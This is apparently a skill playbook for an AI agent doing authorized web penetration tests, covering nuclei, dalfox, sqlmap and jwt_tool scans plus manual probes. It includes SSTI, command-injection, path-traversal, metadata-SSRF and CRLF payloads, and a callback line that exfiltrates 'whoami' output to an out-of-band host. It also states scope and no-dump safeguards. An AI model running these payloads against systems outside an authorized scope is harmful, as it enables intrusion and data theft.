---
name: web-scan
description: Web vulnerability scanning playbook for a Mythos engagement — run nuclei, dalfox, sqlmap, nikto and targeted manual checks in the Kali toolbox against the surface recon mapped, then triage candidates with evidence. Use after recon, when active scanning is authorized, to find XSS, SQLi, SSTI, SSRF, injection, traversal, open-redirect, auth/JWT/CORS/BOLA and misconfig issues.
---

# Web scan — find the vulnerabilities

Find real issues on the surface recon mapped. Run active tools only when
`scope.rules.allow_active` is true. Everything runs in the toolbox via
`scripts/mythos`. Save raw output under `engagements/<dir>/scan/`.

Work one injection point at a time where it matters; the WSL host is RAM-limited,
so do not run nuclei + sqlmap + a browser at once.

If the target has a login, run **auth-session** first and repeat steps 1 to 5
with the session (`nuclei -sf`, `dalfox --cookie/-H`, `sqlmap --cookie`, see the
table there). Run `session_check.py` before each step.

## 1. Broad templated scan — nuclei

```
scripts/mythos nuclei -u <URL> -rl <rate> -c 10 \
  -tags cve,exposure,misconfiguration,default-login,xss,sqli,ssrf,lfi,redirect \
  -severity low,medium,high,critical -stats
```

Scope nuclei by tag to control memory (do not run the full template set on a
large SPA at once). Triage each match: confirm it is real, not a generic banner.

## 2. XSS — dalfox on parameterized endpoints

```
scripts/mythos sh "cat engagements/<dir>/recon/urls.txt | grep '=' | qsreplace FUZZ \
  | dalfox pipe --skip-bav --silence --format json" > engagements/<dir>/scan/dalfox.json
```

For a single endpoint: `scripts/mythos dalfox url '<URL-with-param>' --silence`.
Confirm the reflection context (HTML / attribute / JS / URI) before claiming it.
Stored or blind XSS (input rendered to other users or admins) goes to
**stored-xss-oast**; a dalfox hit there is only a `candidate`.

## 3. SQLi — confirm, do not dump

```
scripts/mythos sqlmap -u '<URL-with-param>' --batch --level 2 --risk 1 \
  --technique=BEUST --banner --threads 2
```

Capture the injectable parameter, DBMS and technique. `--banner` is proof
enough; never dump real data. For JSON/body params pass `--data` and
`-p <param>`. Blind SQLi: let sqlmap confirm with `--technique=BT`.

## 4. Targeted manual checks (fast, precise, low-noise)

Reason about each promising point and test it directly with `curl` in the
toolbox. Pick payloads by the stack recon found.

- **SSTI** (template engines): inject `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`,
  `#{7*7}`; a reflected `49` confirms. Escalate per engine (Jinja2:
  `{{config}}`, `{{self.__init__.__globals__}}`; Twig/Freemarker accordingly).
- **Command injection**: `;id`, `|id`, `$(id)`, backtick `` `id` ``, `%0aid`.
  If output is not reflected it is **blind** — see the blind section below.
- **SSRF**: point a URL param at an OOB collaborator (step 6) or at
  `http://169.254.169.254/latest/meta-data/` and `http://host.docker.internal`.
- **Path traversal / LFI**: `../../../../etc/passwd`, `....//`, URL-encoded
  `%2e%2e%2f`, null-byte/`?` truncation, `php://filter` for source read.
- **Open redirect**: `?next=//evil.example`, `?url=https://evil.example`,
  `?redirect=/\evil.example`; follow with `-I` and read `Location`.
- **CRLF**: `%0d%0aSet-Cookie:mythos=1` in a header-reflected param.

```
scripts/mythos sh "curl -s -G '<URL>' --data-urlencode 'q={{7*7}}' | grep -o '49' && echo SSTI-LIKELY"
```

## 5. Auth / API / access-control

- **JWT**: `scripts/mythos jwt_tool <token> -M at` (alg confusion, `alg:none`,
  weak secret: `jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt`).
- **CORS**: send `Origin: https://evil.example`; a reflected
  `Access-Control-Allow-Origin` + `-Allow-Credentials: true` is a finding.
- **API excessive data exposure**: diff what the UI needs vs what the endpoint
  returns (extra PII, internal fields).
- **BOLA / IDOR, BFLA, mass assignment, races, workflow abuse**: run the
  **business-logic** skill (Subject x Object x Action matrix, `bola_diff.py`,
  `mass_assign.py`, `race.py`) with the userA/userB sessions from
  **auth-session**. Guard against token/auth params that just break the session
  (not a real finding).

## 6. Blind / out-of-band (no reflected output)

Use the OOB collaborator for blind SQLi/SSRF/RCE/XXE:

```
scripts/mythos sh 'interactsh-client -json'    # prints a *.oast.* domain; watch for hits
```

Inject a callback to that domain, e.g. command injection
`;curl http://<id>.oast.fun/$(whoami)` or SSRF `?url=http://<id>.oast.fun`. A DNS/
HTTP hit confirms execution and can exfiltrate data via the subdomain. For a
space-filtered command context use brace expansion `{curl,http://<id>.oast.fun}`
or `${IFS}` instead of spaces. For a purely boolean/time oracle, confirm with a
timing payload (`;sleep 5`) before attempting char-by-char exfil.

In the lab there is no internet egress: use the lab catcher instead of
interactsh (`scripts/mythos net mythos-lab`, callback `http://oast:8080/<token>`,
log `http://oast:8080/__log`).

## 6b. Deep server classes

Serialized blobs, XML/SOAP/SAML/SVG/DOCX input, a CDN or caching proxy, or a
proxy chain in front of the app: run **deep-server** (deserialization, XXE,
cache poisoning/deception, request smuggling). Its scanners produce
candidates only; proof is an OOB token or a differential pair.

## 7. Passive config checks (always, zero risk)

Check on any response: missing `Content-Security-Policy`,
`Strict-Transport-Security`, `X-Content-Type-Options`; cookies without
`Secure`/`HttpOnly`/`SameSite`; verbose `Server`/`X-Powered-By`; directory
listing; stack traces in error responses.

## Coverage matrix

Keep `engagements/<dir>/scan/coverage.md` up to date while scanning, one row
per (class, endpoint), so the report can say what was tested, not just what
was found. States are the closure states from **exploit**, plus `untested`
and `n/a` (class does not apply to this endpoint):

```markdown
| class | endpoint (method path param) | role(s) | tool / check | state | evidence / reason |
|---|---|---|---|---|---|
| sqli | GET /search q | anon | sqlmap BT | rejected(no boolean diff) | scan/sqlmap-search.log |
| xss-stored | POST /api/comments text | userA->userB | xss_verify | reproduced | scan/xss-mx1a2b3c4d.png |
| bola | GET /api/orders/{id} | userA,userB,anon | bola_diff | candidate | scan/bola.jsonl line 4 |
| mass-assign | PUT /api/users/{id} role | userA | mass_assign probe | untested | |
| race | POST /api/redeem code | userA | race.py threads | validated(seq 1 / par 4, x2) | findings/F-03.md |
| smuggling | * front proxy | anon | smuggler | n/a(single server, no proxy) | |
```

Classes to cover per endpoint type: every parameter (sqli, xss, ssti, cmdi,
traversal, ssrf, redirect), every object id (bola, bfla), every write
(mass-assign, csrf), every one-shot action (race, workflow), every XML or
blob input (xxe, deserialization), the site once (headers, cors, cache,
smuggling, jwt).

## Output: candidate findings

Write `engagements/<dir>/scan/candidates.md`: each candidate with class,
severity, affected URL+param, one evidence snippet (the request + the proving
response), and its closure state (`candidate` / `reproduced` /
`rejected(reason)`; nothing is `validated` before the exploit validator pass).
Rank by severity x exploitability. Hand the top candidates to the
**exploit** skill for a minimal PoC; never weaponize here.
